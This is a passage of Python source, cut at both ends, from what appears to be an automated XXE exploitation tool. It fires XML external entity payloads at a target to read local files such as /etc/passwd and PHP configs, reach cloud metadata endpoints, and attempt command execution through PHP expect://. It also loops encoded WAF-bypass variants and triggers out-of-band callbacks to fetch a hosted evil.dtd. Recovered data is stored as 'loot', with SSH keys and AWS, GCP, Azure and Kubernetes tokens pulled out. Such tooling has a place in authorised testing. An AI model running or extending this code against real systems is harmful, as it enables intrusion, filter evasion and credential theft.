                                f.severity = severity
                        except ValueError:
                            pass

                        f.confirmed = f.confirmed or confirmed
                        f.confidence = max(f.confidence, confidence)
                        dbg(f"  ↺ merged into existing {fid} "
                            f"(confidence now {f.confidence})")

                        for r in (reasons or []):
                            if r not in f.reasons:
                                f.reasons.append(r)
                        if evidence:
                            for k, v in evidence.items():
                                existing = f.evidence.get(k)
                                if existing is None:
                                    f.evidence[k] = v
                                elif isinstance(existing, list):
                                    if v not in existing:
                                        existing.append(v)
                                else:
                                    f.evidence[k] = [existing, v]

                        self._emit("finding_updated",
                                   {"finding": f.to_dict()})
                        return

            self._finding_ids.add(fid)
            self._record_chain_stages(fid, evidence or {}, confirmed)
            dbg(f"  ✚ finding {fid} [{severity}] "
                f"confirmed={confirmed} confidence={confidence}")

            cwe_ids = cwes_for(fid)
            cwe_desc = [CWE_DESCRIPTIONS.get(c, c) for c in cwe_ids]

            self.findings.append(Finding(
                id=fid, severity=severity, title=title,
                description=description, impact=impact,
                confirmed=confirmed, exploitability=exploitability,
                cwe=cwe_ids,
                cwe_descriptions=cwe_desc,
                evidence=evidence or {},
                reasons=reasons or [],
                confidence=confidence,
            ))

            self._emit("finding",
                       {"finding": self.findings[-1].to_dict()})

    def _emit(self, kind: str, data: Optional[Dict[str, Any]] = None):
        if self.event_cb is None:
            return
        try:
            self.event_cb(kind, data or {})
        except Exception:
            pass

    def _build_headers(self, content_type: str = "application/xml") -> Dict[str, str]:
        headers = {
            "Content-Type": content_type,
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        if self.base_request:
            for k, v in self.base_request.get("headers", {}).items():
                lk = k.lower()
                if lk not in {"content-length", "host", "content-type", "cookie",
                            "transfer-encoding", "proxy-connection"}:
                    headers[k] = v
        cv = self.cookies.header_value()
        if cv:
            headers["Cookie"] = cv
        return headers

    def _payload_ref(self, payload_bytes: bytes) -> str:
        h = hashlib.sha1(payload_bytes).hexdigest()[:10]
        with self._debug_lock:
            if h in self._seen_payloads:
                return f"payload#{self._seen_payloads[h]}"
            self._payload_counter += 1
            pid = self._payload_counter
            self._seen_payloads[h] = pid

        preview = payload_bytes[:1024]
        try:
            txt = preview.decode("utf-8", errors="replace")
        except Exception:
            txt = repr(preview)
        trunc = len(payload_bytes) > 1024

        dbg(f"      payload#{pid} ({len(payload_bytes)}B)"
            + (" …(truncated)" if trunc else ""))
        for line in (txt.splitlines() or [""]):
            dbg(f"      │ {line}")

        return f"payload#{pid}"

    def _send(self, payload, method: str = "POST",
              content_type: str = "application/xml") -> Tuple[Optional[httpx.Response], float]:
        if self.rate_limiter:
            self.rate_limiter.wait()

        headers = self._build_headers(content_type)
        payload_bytes = payload.encode("utf-8") if isinstance(payload, str) else payload

        if _debug_on():
            path = urlparse(self.url).path or "/"
            ref = self._payload_ref(payload_bytes)
            dbg(f"  → {method} {path} [{content_type}] "
                f"{len(payload_bytes)}B {ref}")

        last_err = None
        for attempt in range(3):
            start = time.time()
            try:
                resp = self.session.request(
                    method, self.url, headers=headers,
                    content=payload_bytes,
                    timeout=_as_httpx_timeout(self.timeout),
                    follow_redirects=False,
                )
                elapsed = time.time() - start
                if resp is not None and self.cookies.merge_set_cookie:
                    self.cookies.merge_response_cookies(resp)
                if resp.status_code in (429, 503):
                    ra = resp.headers.get("Retry-After")
                    if ra and str(ra).isdigit():
                        time.sleep(min(int(ra), 10))
                return resp, elapsed
            except (httpx.ConnectError,
                    httpx.RemoteProtocolError,
                    httpx.ReadError,
                    httpx.WriteError) as e:
                last_err = e
                dbg(f"send attempt {attempt + 1} failed: {e!r}")
                time.sleep((1.5 ** attempt) * 0.5)
            except httpx.TimeoutException as e:
                last_err = e
                dbg(f"send attempt {attempt + 1} timed out: {e!r}")
                time.sleep((1.5 ** attempt) * 0.5)
            except httpx.HTTPError as e:
                last_err = e
                dbg("send fatal:", repr(e))
                return None, 0.0
            except Exception as e:
                last_err = e
                dbg("send fatal:", repr(e))
                return None, 0.0
        if last_err:
            dbg("send exhausted retries:", repr(last_err))
        return None, 0.0

    def _verify_entity_chain(self, payload: str, resp: httpx.Response) -> bool:
        body = resp.text or ""
        if "&xxe;" in body or "&send;" in body or "&error;" in body:
            return False
        if self.accuracy.looks_like_markup(body):
            return False
        file_type, count = self.accuracy.detect_file_fingerprint(body)
        return bool(file_type and count >= 2)

    def _capture_loot(self, file_path: Optional[str],
                      resp: httpx.Response,
                      technique: str) -> Optional[str]:
        if not file_path or resp is None:
            return None
        body = resp.text or ""
        if not body:
            return None

        fp_type, _count = self.accuracy.detect_file_fingerprint(body)
        content = FileContentExtractor.extract(body, file_path, fp_type)
        if not content:
            return None

        indicators: List[str] = []
        if fp_type:
            indicators.append(f"fingerprint:{fp_type}")
        if content.strip().startswith("-----BEGIN"):
            indicators.append("pem_block")
        if re.search(r"(?m)^[a-z_][a-z0-9_-]*:\d+:\d+:", content):
            indicators.append("passwd_format")

        loot_key = self.loot.add_file(
            target_url=self.url,
            source_path=file_path,
            technique=technique,
            content=content,
            indicators=indicators,
        )
        if loot_key:
            entry = self.loot.get(loot_key)
            if entry:
                self._emit("loot", {"entry": entry})
        return loot_key or None

    def _ingest_oob_exfil(self, hits: List[Dict[str, Any]],
                          technique: str,
                          subdomain: str,
                          file_target: Optional[str]) -> Optional[str]:
        if not hits:
            return None

        session_domain = getattr(self.oob, "server", "") or ""
        first_loot_key: Optional[str] = None
        first_preview: str = ""

        for hit in hits:
            try:
                raw = OOBExfilExtractor.extract(hit, session_domain)
            except Exception as e:
                dbg(f"OOB exfil extract failed for {technique}: {e!r}")
                continue
            if not raw:
                continue

            content = None
            fp_type = None
            if file_target:
                fp_type, _count = self.accuracy.detect_file_fingerprint(raw)
                try:
                    content = FileContentExtractor.extract(
                        raw, file_target, fp_type)
                except Exception as e:
                    dbg(f"OOB file-content extract failed: {e!r}")
                    content = None
            if not content:
                content = raw

            indicators = ["oob_exfil"]
            if fp_type:
                indicators.append(f"fingerprint:{fp_type}")

            try:
                loot_key = self.loot.add_file(
                    target_url=self.url,
                    source_path=file_target or f"oob/{technique}",
                    technique=technique,
                    content=content,
                    indicators=indicators,
                )
            except Exception as e:
                dbg(f"OOB loot add_file failed for {technique}: {e!r}")
                continue

            if not loot_key:
                continue

            entry = self.loot.get(loot_key)
            if entry:
                self._emit("loot", {"entry": entry})

            if first_loot_key is None:
                first_loot_key = loot_key
                first_preview = self.loot.preview(loot_key, 400)

        if first_loot_key:
            self.oob.mark_observation_exfiltrated(
                subdomain, first_preview, first_loot_key)
            self._emit("oob_exfil", {
                "technique": technique,
                "subdomain": subdomain,
                "loot_id": first_loot_key,
                "preview": first_preview,
            })

        return first_loot_key

    def _loot_evidence(self, file_path: Optional[str],
                       resp: httpx.Response,
                       technique: str,
                       base: Optional[Dict[str, Any]] = None,
                       ) -> Dict[str, Any]:
        ev = dict(base or {})
        if not file_path or resp is None:
            return ev
        try:
            loot_key = self._capture_loot(file_path, resp, technique)
        except Exception as e:
            dbg(f"loot capture failed for {technique}: {e!r}")
            return ev
        if not loot_key:
            return ev
        ev["loot_id"] = loot_key
        ev["source_path"] = file_path
        preview = self.loot.preview(loot_key, 400)
        if preview:
            ev["extracted_content_preview"] = preview
        creds = self.loot.credentials(loot_key)
        if creds:
            ev["extracted_credentials"] = creds
        return ev

    def _record_chain_stages(self, fid: str, evidence: Dict[str, Any],
                             confirmed: bool):
        if fid.startswith("XXE-CHAIN-"):
            return

        ev = evidence or {}

        if fid.startswith("XXE-"):
            self.chain.record("xxe_attempted",
                              {"finding": fid}, url=self.url)

        proof_keys = [k for k in
                      ("file_type", "chain_integrity", "oob_correlated",
                       "loot_id", "provider", "cloud_provider",
                       "credentials_exposed", "markers_matched",
                       "wrapper")
                      if k in ev]
        if proof_keys:
            self.chain.record(
                "xxe_confirmed",
                {"finding": fid,
                 "proof": {k: ev[k] for k in proof_keys}},
                url=self.url,
            )

        if ev.get("loot_id"):
            source_path = (ev.get("file") or ev.get("source_path") or "")
            self.chain.record(
                "file_content_recovered",
                {"finding": fid, "loot_id": ev["loot_id"],
                 "file_type": ev.get("file_type"),
                 "source_path": source_path},
                url=self.url,
            )

            if "serviceaccount/token" in source_path.lower():
                self.chain.record(
                    "k8s_sa_token_extracted",
                    {"finding": fid, "source_path": source_path,
                     "loot_id": ev["loot_id"]},
                    url=self.url,
                )

        creds = ev.get("extracted_credentials") or []
        if creds:
            kinds = sorted({c.get("kind", "unknown") for c in creds})
            self.chain.record(
                "credential_extracted",
                {"finding": fid, "count": len(creds), "kinds": kinds},
                url=self.url,
            )
            if "ssh_private_key" in kinds:
                ssh_count = sum(
                    1 for c in creds
                    if c.get("kind") == "ssh_private_key"
                )
                self.chain.record(
                    "ssh_key_extracted",
                    {"finding": fid, "count": ssh_count},
                    url=self.url,
                )

        if fid.startswith("XXE-ERROR-BASED") and ev.get("leaked_content"):
            self.chain.record(
                "error_based_leak",
                {"finding": fid, "dtd": ev.get("dtd"),
                 "entity": ev.get("entity")},
                url=self.url,
            )

        if fid.startswith("XXE-CLOUD-METADATA"):
            prov = ev.get("provider")
            if prov:
                self.chain.record(
                    "ssrf_metadata_reachable",
                    {"finding": fid, "provider": prov,
                     "url": ev.get("url")},
                    url=self.url,
                )
            has_cloud_creds = bool(ev.get("extracted_credentials")) \
                or bool(ev.get("credentials_exposed"))

            if prov == "aws" and has_cloud_creds:
                self.chain.record(
                    "iam_credentials_extracted",
                    {"finding": fid, "provider": prov,
                     "count": len(ev.get("extracted_credentials") or [])},
                    url=self.url,
                )

            if prov == "k8s":
                self.chain.record(
                    "k8s_secrets_reachable",
                    {"finding": fid, "url": ev.get("url"),
                     "indicators": ev.get("indicators")},
                    url=self.url,
                )

            if prov == "gcp" and has_cloud_creds:
                self.chain.record(
                    "gcp_token_extracted",
                    {"finding": fid, "url": ev.get("url")},
                    url=self.url,
                )

            if prov == "azure" and has_cloud_creds:
                self.chain.record(
                    "azure_token_extracted",
                    {"finding": fid, "url": ev.get("url")},
                    url=self.url,
                )

        if (fid.startswith("XXE-BLIND-OOB")
                or fid.startswith("XXE-PARAMETER-ENTITY")
                or fid.startswith("XXE-CDATA-BYPASS")):
            if ev.get("token") or ev.get("callback"):
                self.chain.record(
                    "oob_callback_correlated",
                    {"finding": fid, "callback": ev.get("callback"),
                     "technique": fid},
                    url=self.url,
                )

        if fid.startswith("XXE-PHP-FILTER-SOURCE"):
            self.chain.record(
                "php_filter_source_leak",
                {"finding": fid, "file": ev.get("file")},
                url=self.url,
            )

        if fid.startswith("XXE-RCE-"):
            self.chain.record(
                "rce_wrapper_resolved",
                {"finding": fid,
                 "wrapper": ev.get("wrapper", "unknown")},
                url=self.url,
            )

        if fid.startswith("XXE-WAF-BYPASS"):
            self.chain.record(
                "waf_bypass_success",
                {"finding": fid, "encoding": ev.get("encoding"),
                 "base_payload": ev.get("base_payload")},
                url=self.url,
            )

    def _score_and_report(self, fid: str, severity: str, title: str,
                          description: str, impact: str,
                          payload, resp, elapsed: float,
                          oob_hit: bool = False,
                          oob_correlated: bool = False,
                          chain_integrity: bool = False,
                          extra_evidence: Optional[Dict] = None,
                          extra_reasons: Optional[List[str]] = None,
                          mandatory_override: bool = False,
                          severity_override: Optional[str] = None,
                          file_target: Optional[str] = None):
        if resp is None:
            return

        payload_str = payload if isinstance(payload, str) else \
            payload.decode("utf-8", errors="ignore")

        score, evidence, reasons = self.accuracy.score(
            self.baseline, resp, payload_str, elapsed,
            oob_hit=oob_hit, oob_correlated=oob_correlated,
            chain_integrity=chain_integrity,
        )

        if extra_evidence:
            evidence.update(extra_evidence)
        if extra_reasons:
            reasons.extend(extra_reasons)
        if file_target and "file_type" in evidence:
            try:
                loot_key = self._capture_loot(
                    file_target, resp,
                    technique=fid,
                )
            except Exception as e:
                dbg(f"loot capture failed for {fid}: {e!r}")
                loot_key = None
            if loot_key:
                evidence["loot_id"] = loot_key
                evidence["source_path"] = file_target
                preview = self.loot.preview(loot_key, 400)
                if preview:
                    evidence["extracted_content_preview"] = preview
                creds = self.loot.credentials(loot_key)
                if creds:
                    existing = evidence.get("extracted_credentials") or []
                    seen = {json.dumps(c, sort_keys=True)
                            for c in existing}
                    for c in creds:
                        sig = json.dumps(c, sort_keys=True)
                        if sig not in seen:
                            existing.append(c)
                            seen.add(sig)
                    evidence["extracted_credentials"] = existing
                    reasons.append(
                        f"{len(creds)} credential(s) extracted from "
                        f"{file_target}"
                    )
        mandatory = mandatory_override or any(
            k in evidence for k in
            ("file_type", "oob_correlated", "chain_integrity")
        )

        independent = sum(1 for k in (
            "file_type", "oob_correlated", "chain_integrity",
            "parser_error", "response_elapsed",
        ) if k in evidence)

        exploitability, confirmed, sev = self.accuracy.classify(
            score, mandatory, independent
        )

        if severity_override and sev_order_high(severity_override, sev):
            sev = severity_override

        if score <= 0:
            return

        veto = evidence.get("veto")

        if sev in {"CRITICAL", "HIGH", "MEDIUM"}:
            dbg(f"      ✔ {sev} score={score} {fid}")
            for r in reasons:
                dbg(f"          · {r}")
            self.add_finding(
                fid, sev, title, description, impact,
                confirmed=confirmed, exploitability=exploitability,
                evidence={**evidence, "score": score},
                reasons=reasons, confidence=score,
            )
        elif veto:
            dbg(f"      ✗ {fid}: vetoed ({veto})")
        else:
            dbg(f"      · {fid}: score={score} < threshold "
                f"(sev={sev}, no finding)")

    def _run_phase(self, name: str, fn, *args, **kwargs):
        if self.ctx.expired():
            self._emit("phase_skipped", {"name": name, "reason": "budget"})
            dbg(f"  ⊘ {name}: skipped (budget expired)")
            return

        self._current_phase = name
        self._emit("phase_start", {"name": name})
        dbg(f"  ┌─ phase: {name}")
        phase_start = time.time()

        try:
            fn(*args, **kwargs)
        except Exception as e:
            warn(f"phase {name} raised: {type(e).__name__}: {e}")
            dbg(f"phase {name} traceback:", repr(e))
            self._emit("phase_error",
                       {"name": name, "error": f"{type(e).__name__}: {e}"})

        elapsed = time.time() - phase_start
        self._emit("phase_end", {
            "name": name,
            "elapsed": round(elapsed, 2),
            "findings": len(self.findings),
        })
        dbg(f"  └─ phase: {name} "
            f"[{elapsed:.2f}s, {len(self.findings)} finding(s)]")

    def _waf_bypass_catalogue(self):
        items: List[Tuple[str, str, str, bool, str, str, Any]] = []

        # in-band file reads
        file_targets = list(XXEPayloadGenerator.PRIORITY_FILES)
        if self.full_file_scan:
            seen = set(file_targets)
            for p in (XXEPayloadGenerator.LINUX_FILES
                      + XXEPayloadGenerator.WINDOWS_FILES):
                if p not in seen:
                    seen.add(p)
                    file_targets.append(p)
        for fpath in file_targets:
            items.append(("inband", f"file-{_short_label_for(fpath)}",
                          "application/xml", False, "", "",
                          XXEPayloadGenerator.classic_file_read(fpath)))
        for fpath in ("index.php", "config.php", "/etc/passwd"):
            items.append(("inband",
                          f"php-filter-{_short_label_for(fpath)}",
                          "application/xml", False, "", "",
                          XXEPayloadGenerator.php_filter_read(fpath)))
        items.append(("inband", "php-expect", "application/xml",
                      False, "", "",
                      XXEPayloadGenerator.php_expect_rce("id")))

        # SSRF + cloud metadata
        for url in XXEPayloadGenerator.METADATA_URLS:
            slug = re.sub(r"[^a-z0-9]+", "-", url.lower()).strip("-")[:36]
            items.append(("ssrf", f"meta-{slug}", "application/xml",
                          False, "", "",
                          XXEPayloadGenerator.ssrf_entity(url)))
        for provider, url, _k, _s, _l in self.METADATA_PROVIDERS:
            slug = re.sub(r"[^a-z0-9]+", "-", url.lower()).strip("-")[:36]
            items.append(("ssrf", f"cloud-{provider}-{slug}",
                          "application/xml", False, "", "",
                          XXEPayloadGenerator.ssrf_entity(url)))

        # RCE wrappers
        for label, payload in (
            ("jar",  XXEPayloadGenerator.java_jar_read()),
            ("data", XXEPayloadGenerator.php_data_wrapper()),
            ("phar", XXEPayloadGenerator.php_phar_wrapper()),
            ("glob", XXEPayloadGenerator.php_glob_enum()),
            ("zlib", XXEPayloadGenerator.php_compress_zlib()),
        ):
            items.append(("rce", label, "application/xml",
                          False, "", "", payload))

        # error-based
        for dtd_path, entity_names in _iter_local_dtds():
            slug = _short_label_for(dtd_path)
            for entity in entity_names:
                items.append((
                    "error_based", f"dtd-{slug}-{entity}",
                    "application/xml", False, "", "",
                    XXEPayloadGenerator.error_based_local_dtd(
                        dtd_path, entity_name=entity)))
        items.append(("error_based", "malformed", "application/xml",
                      False, "", "",
                      XXEPayloadGenerator.error_based_malformed()))

        # xinclude
        for fpath in ("/etc/passwd", "/etc/hostname"):
            items.append(("xinclude", f"file-{_short_label_for(fpath)}",
                          "application/xml", False, "", "",
                          XXEPayloadGenerator.xinclude_file(fpath)))
        for target in ("http://169.254.169.254/latest/meta-data/",
                       "http://127.0.0.1:80/"):
            slug = re.sub(r"[^a-z0-9]+", "-", target.lower()).strip("-")[:36]
            items.append(("xinclude", f"ssrf-{slug}",
                          "application/xml", False, "", "",
                          XXEPayloadGenerator.xinclude_ssrf(target)))

        # SAML / SOAP
        items.append(("saml", "saml-assertion",
                      "application/samlassertion+xml", False, "", "",
                      XXEPayloadGenerator.saml_xxe()))
        items.append(("soap", "soap-envelope",
                      "application/soap+xml", False, "", "",
                      XXEPayloadGenerator.soap_xxe()))

        # json-to-xml probe
        items.append(("json_to_xml", "probe", "application/xml",
                      False, "", "",
                      XXEPayloadGenerator.json_probe_xml()))

        # OOB — only when a live OOB client exists.
        if self.oob:
            oob_specs = [
                ("xxe-dns", "application/xml", "xxe-dns",
                 lambda sub: XXEPayloadGenerator.oob_dns_only(sub)),
                ("xxe-dtd", "application/xml", "xxe-dtd",
                 lambda sub: XXEPayloadGenerator.oob_external_dtd(
                     dtd_url=f"http://{sub}/evil.dtd",
                     callback_domain=sub)[0]),
                ("pe-dns", "application/xml", "pe-dns",
                 lambda sub: XXEPayloadGenerator.parameter_entity_dns_raw(sub)),
                ("cdata", "application/xml", "cdata",
                 lambda sub: XXEPayloadGenerator.cdata_external_dtd(
                     dtd_url=f"http://{sub}/cdata.dtd",
                     callback_domain=sub)[0]),
                ("xslt-doc", "application/xslt+xml", "xslt-document",
                 lambda sub: XXEPayloadGenerator.xslt_document(
                     f"http://{sub}/xslt")),
                ("xslt-inc", "application/xslt+xml", "xslt-include",
                 lambda sub: XXEPayloadGenerator.xslt_include(
                     f"http://{sub}/xslt-include")),
                ("xsd-loc", "application/xml", "xsd-schemalocation",
                 lambda sub: XXEPayloadGenerator.xsd_schema_location(
                     f"http://{sub}/schema.xsd")),
                ("xsd-import", "application/xml", "xsd-import",
                 lambda sub: XXEPayloadGenerator.xsd_import(
                     f"http://{sub}/imported.xsd")),
                ("xml-stylesheet", "application/xml", "xml-stylesheet",
                 lambda sub: XXEPayloadGenerator.xml_stylesheet_pi(
                     f"http://{sub}/style.xsl")),
                ("xinclude-xml", "application/xml", "xinclude-xml",
                 lambda sub: XXEPayloadGenerator.xinclude_xml(
                     f"http://{sub}/inc.xml")),
                ("multipart", "multipart/form-data", "multipart-xml",
                 lambda sub: XXEPayloadGenerator.multipart_xml(sub)[0]),
                ("form-xml", "application/x-www-form-urlencoded", "form-xml",
                 lambda sub: XXEPayloadGenerator.form_xml(sub)),
            ]
            for label, ct, technique, factory in oob_specs:
                items.append(("oob", label, ct, True, technique, "", factory))

        # customs (opt-in)
        if self.bypass_waf_include_custom and len(self.custom_payloads) > 0:
            for cp in self.custom_payloads:
                if "{CALLBACK}" in cp.template or "{DOMAIN}" in cp.template:
                    dbg(f"WAF bypass: skipping custom '{cp.name}' — "
                        f"OOB placeholder not supported in encoded mode")
                    continue
                try:
                    rendered = cp.render(file_target="/etc/passwd")
                except Exception as e:
                    dbg(f"WAF bypass: custom '{cp.name}' render failed: {e!r}")
                    continue
                if not rendered.strip():
                    continue
                items.append(("custom", f"{cp.name}-passwd",
                              "application/xml", False, "", "",
                              cp.encode(rendered)))

        return items

    def _phase_waf_bypass(self):
        if not self.bypass_waf_encoders:
            return

        encoders = WafBypassEncoder.selected(self.bypass_waf_encoders)
        if not encoders:
            dbg("WAF bypass: no valid encoders selected — phase skipped")
            return

        catalogue = self._waf_bypass_catalogue()
        if not catalogue:
            return

        planned = len(catalogue) * len(encoders)
        dbg(f"WAF bypass: {len(catalogue)} payload(s) × "
            f"{len(encoders)} encoder(s) = {planned} request(s)")
        dbg(f"WAF bypass: encoders = {[n for n, _ in encoders]}")
        dbg(f"WAF bypass: OOB {'on' if self.oob else 'off'}, "
            f"custom {'on' if self.bypass_waf_include_custom else 'off'}")

        for family, label, base_ct, is_oob, technique, note, payload in catalogue:
            if self.ctx.expired():
                return
            for enc_name, enc_fn in encoders:
                if self.ctx.expired():
                    return

                if is_oob:
                    subdomain, token = (
                        self.oob.generate_correlated_subdomain(
                            f"wafb-{label}"))
                    try:
                        concrete = payload(subdomain)
                    except Exception as e:
                        dbg(f"WAF bypass: OOB factory {label} failed: {e!r}")
                        continue
                else:
                    concrete = payload
                    subdomain = ""
                    token = ""

                try:
                    encoded = enc_fn(concrete)
                except Exception as e:
                    dbg(f"WAF bypass: encoder {enc_name} failed on "
                        f"{label}: {e!r}")
                    continue

                def _as_bytes(x):
                    return x.encode("utf-8") if isinstance(x, str) else x

                if _as_bytes(encoded) == _as_bytes(concrete):
                    dbg(f"WAF bypass: {enc_name} was a no-op on "
                        f"{label} — skipped")
                    continue

                ct = WafBypassEncoder.CONTENT_TYPES.get(enc_name, base_ct)

                if is_oob:
                    hit = self._send_oob_and_check(
                        f"wafb-{technique or label}", subdomain,
                        f"[WAF bypass/{enc_name}] {note or label}",
                        encoded, content_type=ct,
                    )
                    if hit:
                        label_slug = re.sub(r"[^A-Z0-9]+", "-",
                                            label.upper()).strip("-") or "OOB"
                        self.add_finding(
                            f"XXE-WAF-BYPASS-{enc_name.upper()}-{label_slug}", "CRITICAL",
                            f"Blind XXE via WAF bypass ({enc_name}, {label})",
                            f"Encoded OOB payload '{label}' triggered a "
                            f"correlated callback after {enc_name} "
                            f"transformation.",
                            "WAF bypassed; blind XXE exploitable",
                            confirmed=True, exploitability="confirmed",
                            evidence={
                                "encoding":     enc_name,
                                "base_payload": label,
                                "family":       family,
                                "content_type": ct,
                                "callback":     subdomain,
                                "token":        token,
                                "score":        50,
                            },
                            reasons=[f"Correlated OOB callback for "
                                    f"{label} × {enc_name}"],
                            confidence=50,
                        )
                    continue

                resp, elapsed = self._send(encoded, content_type=ct)
                if resp is None:
                    continue

                chain_ok = self._verify_entity_chain(concrete, resp)

                self._score_and_report(
                    f"XXE-WAF-BYPASS-{enc_name.upper()}", "HIGH",
                    f"XXE via WAF bypass ({enc_name}, {label})",
                    f"Payload '{label}' resolved after {enc_name} "
                    f"encoding — the WAF did not match the transformed "
                    f"request.",
                    "WAF / input-filter bypass leading to XXE",
                    concrete, resp, elapsed,
                    chain_integrity=chain_ok,
                    extra_evidence={
                        "encoding":     enc_name,
                        "base_payload": label,
                        "family":       family,
                        "content_type": ct,
                    },
                    extra_reasons=[
                        f"'{label}' encoded as {enc_name} bypassed "
                        f"input filtering"
                    ],
                )

    def _phase_form_encoded(self):
        if not self.oob:
            return

        subdomain, token = self.oob.generate_correlated_subdomain("form-xml")
        body = XXEPayloadGenerator.form_xml(subdomain)

        if self._send_oob_and_check(
                "form-xml", subdomain,
                "Form-encoded XML field with external parameter entity",
                body,
                content_type="application/x-www-form-urlencoded"):
            self.add_finding(
                "XXE-FORM-ENCODED", "CRITICAL",
                "Blind XXE via form-encoded XML field",
                "Form-encoded XML field triggered a correlated OOB callback",
                "Blind XXE — full exploitation possible",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain,
                    "token": token,
                    "score": 50,
                },
                reasons=["Correlated OOB callback from form-encoded XML field"],
                confidence=50,
            )

    def _phase_fingerprint(self):
        if not self.no_fingerprint_cache:
            cache = _load_fingerprint_cache()
            cached = cache.get(self.url)
            if cached:
                dbg(f"      fingerprint cache hit "
                    f"(parser={cached.get('parser', 'unknown')})")
                fp = ParserFingerprint(
                    session=self.session,
                    url=self.url,
                    cookies=self.cookies,
                    base_request=self.base_request,
                    send_fn=self._send,
                )
                fp.parser = cached["parser"]
                fp.capabilities = cached["capabilities"]
                self.fingerprint = fp
                if fp.parser != "unknown":
                    self.add_finding(
                        "XXE-PARSER-FINGERPRINT", "INFO",
                        f"XML parser identified: {fp.parser}",
                        f"Parser fingerprint detected as '{fp.parser}' "
                        f"(cached)",
                        "Enables targeted exploitation",
                        confirmed=True, exploitability="confirmed",
                        evidence={"parser": fp.parser,
                                  "capabilities": fp.capabilities,
                                  "cached": True},
                        reasons=[f"Parser fingerprint cache hit for "
                                 f"'{fp.parser}'"],
                        confidence=10,
                    )
                return

        fp = ParserFingerprint(
            session=self.session,
            url=self.url,
            cookies=self.cookies,
            base_request=self.base_request,
            send_fn=self._send,
        )
        self.fingerprint = fp
        parser = fp.fingerprint()

        if not self.no_fingerprint_cache:
            cache = _load_fingerprint_cache()
            cache[self.url] = {
                "parser": parser,
                "capabilities": fp.capabilities,
                "ts": time.time(),
            }
            _save_fingerprint_cache(cache)

        if parser != "unknown":
            self.add_finding(
                "XXE-PARSER-FINGERPRINT", "INFO",
                f"XML parser identified: {parser}",
                f"Parser fingerprint detected as '{parser}'",
                "Enables targeted exploitation",
                confirmed=True, exploitability="confirmed",
                evidence={"parser": parser, "capabilities": fp.capabilities},
                reasons=[f"Parser error signatures matched '{parser}'"],
                confidence=10,
            )

    def _phase_inband_file_read(self):
        if self.fingerprint and self.fingerprint.capabilities:
            caps = self.fingerprint.capabilities
            could_not_fingerprint = all(v is False for v in caps.values())
            entity_works = any(
                caps.get(k) for k in (
                    "internal_entity",
                    "external_file",
                    "external_dtd",
                    "parameter_entity",
                    "dtd_allowed",
                )
            )
            if not (could_not_fingerprint or entity_works):
                dbg(f"Skipping in-band file read — fingerprint reports no "
                    f"entity resolution: {caps}")
                return

        targets = list(XXEPayloadGenerator.PRIORITY_FILES)
        if self.full_file_scan:
            seen = set(targets)
            for p in XXEPayloadGenerator.LINUX_FILES:
                if p not in seen:
                    seen.add(p)
                    targets.append(p)
            for p in XXEPayloadGenerator.WINDOWS_FILES:
                if p not in seen:
                    seen.add(p)
                    targets.append(p)

        for fpath in targets:
            if self.ctx.expired():
                return
            label = _short_label_for(fpath)
            payload = XXEPayloadGenerator.classic_file_read(fpath)
            resp, elapsed = self._send(payload)
            if resp is None:
                continue
            chain_ok = self._verify_entity_chain(payload, resp)
            self._score_and_report(
                f"XXE-INBAND-FILE-READ-{label}", "CRITICAL",
                f"In-band XXE file read: {fpath}",
                f"External entity resolved and file content reflected: {fpath}",
                "Arbitrary local file disclosure",
                payload, resp, elapsed,
                chain_integrity=chain_ok,
                extra_evidence={"file": fpath},
                file_target=fpath,
            )

        for fpath in ["index.php", "config.php", "/etc/passwd"]:
            if self.ctx.expired():
                return
            payload = XXEPayloadGenerator.php_filter_read(fpath)
            resp, elapsed = self._send(payload)
            if resp is None:
                continue
            body = resp.text or ""
            for match in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", body):
                try:
                    decoded = base64.b64decode(match, validate=True) \
                                    .decode("utf-8", errors="ignore")
                    if ("<?php" in decoded
                            or "DB_PASSWORD" in decoded
                            or "AWS_SECRET_ACCESS_KEY" in decoded
                            or "APP_KEY" in decoded):
                        loot_key = self.loot.add_file(
                            target_url=self.url,
                            source_path=fpath,
                            technique="XXE-PHP-FILTER-SOURCE",
                            content=decoded,
                            indicators=["php_filter_decoded"],
                        )
                        if loot_key:
                            self._emit("loot",
                                       {"entry": self.loot.get(loot_key)})
                        ev: Dict[str, Any] = {
                            "file": fpath,
                            "decoded_snippet": decoded[:300],
                            "score": 80,
                        }
                        if loot_key:
                            ev["loot_id"] = loot_key
                            ev["source_path"] = fpath
                            ev["extracted_content_preview"] = \
                                self.loot.preview(loot_key, 400)
                            creds = self.loot.credentials(loot_key)
                            if creds:
                                ev["extracted_credentials"] = creds
                        self.add_finding(
                            "XXE-PHP-FILTER-SOURCE", "CRITICAL",
                            "PHP source disclosure via XXE php://filter",
                            f"Base64-encoded PHP source extracted from {fpath}",
                            "Source code disclosure leading to credential theft",
                            confirmed=True, exploitability="confirmed",
                            evidence=ev,
                            reasons=[f"Decoded PHP source from {fpath}"],
                            confidence=80,
                        )
                        break
                except (binascii.Error, ValueError):
                    pass

        if self.ctx.expired():
            return
        payload = XXEPayloadGenerator.php_expect_rce("id")
        resp, elapsed = self._send(payload)
        if resp is not None:
            body = resp.text or ""
            uid_hit = re.search(r"uid=\d+\(\w+\)\s+gid=\d+\(\w+\)", body)
            if uid_hit and not self.baseline.body_contains(uid_hit.group(0)):
                self.add_finding(
                    "XXE-PHP-EXPECT-RCE", "CRITICAL",
                    "XXE-to-RCE via PHP expect:// wrapper",
                    "Command 'id' executed and output reflected",
                    "Remote code execution on the server",
                    confirmed=True, exploitability="confirmed",
                    evidence={
                        "command": "id",
                        "output_snippet": body[:300],
                        "score": 70,
                    },
                    reasons=["id(1)-formatted output (uid=N(user) gid=N(group)) "
                             "present only in the XXE response"],
                    confidence=70,
                )

    def _phase_ssrf(self):
        for target_url in XXEPayloadGenerator.METADATA_URLS:
            if self.ctx.expired():
                return
            if any(h in target_url for h in self._CLOUD_METADATA_HOSTS):
                continue
            payload = XXEPayloadGenerator.ssrf_entity(target_url)
            resp, elapsed = self._send(payload)
            if resp is None:
                continue
            body = resp.text or ""
            provider, count = self.accuracy.detect_cloud_metadata(body)

            extra = {}
            reasons = []
            mandatory = False

            if (provider and count >= 2
                    and not self.accuracy.looks_like_markup(body)):
                extra["cloud_provider"] = provider
                extra["metadata_indicators"] = count
                reasons.append(f"Cloud metadata '{provider}' matched "
                               f"({count} indicators)")
                mandatory = True

            self._score_and_report(
